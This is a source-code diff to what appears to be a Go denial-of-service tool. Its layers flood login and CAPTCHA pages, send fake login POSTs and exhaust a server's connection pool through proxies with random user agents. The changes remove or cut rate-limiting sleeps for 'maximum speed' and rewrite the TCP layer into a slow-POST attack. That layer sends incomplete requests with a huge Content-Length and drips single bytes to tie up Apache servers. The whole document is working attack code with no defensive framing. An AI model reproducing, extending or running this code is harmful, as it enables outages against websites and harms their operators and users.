@@ -59,7 +59,7 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(100)+20) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(50)+5) * time.Millisecond)
 	}
 }
 
@@ -68,12 +68,12 @@ func slowLoginBody() io.Reader {
 	go func() {
 		defer w.Close()
 		w.Write([]byte("username=" + strings.Repeat("A", 512)))
-		time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
 		w.Write([]byte("&password=" + strings.Repeat("B", 512)))
-		time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond)
 		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
-		for i := 0; i < 10; i++ {
-			time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond)
+		for i := 0; i < 5; i++ {
+			time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
 			w.Write([]byte("&x" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("Y", 64)))
 		}
 	}()
@@ -81,7 +81,7 @@ func slowLoginBody() io.Reader {
 }
 
 // ============================================================
-// LAYER 2: CAPTCHA / LOGIN PAGE FLOOD
+// LAYER 2: CAPTCHA / LOGIN PAGE FLOOD (HIGH SPEED)
 // ============================================================
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
@@ -124,12 +124,12 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
+		// No sleep — maximum speed
 	}
 }
 
 // ============================================================
-// LAYER 3: FAKE LOGIN POST
+// LAYER 3: FAKE LOGIN POST (HIGH SPEED)
 // ============================================================
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
@@ -178,15 +178,24 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
+		// No sleep — maximum speed
 	}
 }
 
 // ============================================================
-// LAYER 4: TCP POOL EXHAUST
+// LAYER 4: AGGRESSIVE TCP POOL EXHAUST (NO WAIT)
 // ============================================================
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
+	host := o.target.Host
+	// Ensure host has port
+	if !strings.Contains(host, ":") {
+		if o.target.Scheme == "https" {
+			host += ":443"
+		} else {
+			host += ":80"
+		}
+	}
 
 	for {
 		select {
@@ -195,43 +204,38 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
+		conn, err := net.DialTimeout("tcp", host, 5*time.Second)
 		if err != nil {
-			time.Sleep(10 * time.Second)
-			continue
+			continue // Immediately retry
 		}
 
 		o.stats.TotalRequests.Add(1)
 		o.stats.Layers[layerIdx].Requests.Add(1)
+		o.stats.SuccessRequests.Add(1)
+		o.stats.Layers[layerIdx].Success.Add(1)
 
-		reqStr := fmt.Sprintf(
-			"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n",
-			o.smartPaths.LoginGET, o.target.Host, randomUA(),
+		// Send incomplete POST request — Apache waits for Content-Length body
+		incompleteReq := fmt.Sprintf(
+			"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999\r\nConnection: keep-alive\r\n\r\n",
+			o.smartPaths.LoginPOST, o.target.Host,
 		)
-		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-		conn.Write([]byte(reqStr))
 
-		duration := time.Duration(rand.Intn(60)+60) * time.Second
-		deadline := time.Now().Add(duration)
+		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+		conn.Write([]byte(incompleteReq))
+
+		// Hold connection for 30 seconds, drip data slowly
+		deadline := time.Now().Add(30 * time.Second)
 		for time.Now().Before(deadline) {
 			select {
 			case <-ctx.Done():
 				conn.Close()
 				return ctx.Err()
-			case <-time.After(15 * time.Second):
-				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-				conn.Write([]byte("X-Keep-Alive: " + randomString(32) + "\r\n"))
+			case <-time.After(time.Duration(rand.Intn(2000)+500) * time.Millisecond):
+				conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+				conn.Write([]byte("x")) // Single byte to keep connection alive
 			}
 		}
 		conn.Close()
-		o.stats.SuccessRequests.Add(1)
-		o.stats.Layers[layerIdx].Success.Add(1)
-
-		select {
-		case <-ctx.Done():
-			return ctx.Err()
-		case <-time.After(time.Duration(rand.Intn(30)+30) * time.Second):
-		}
 	}
 }
 
@@ -297,7 +301,7 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
+		time.Sleep(time.Duration(rand.Intn(30)+5) * time.Millisecond)
 	}
 }
 
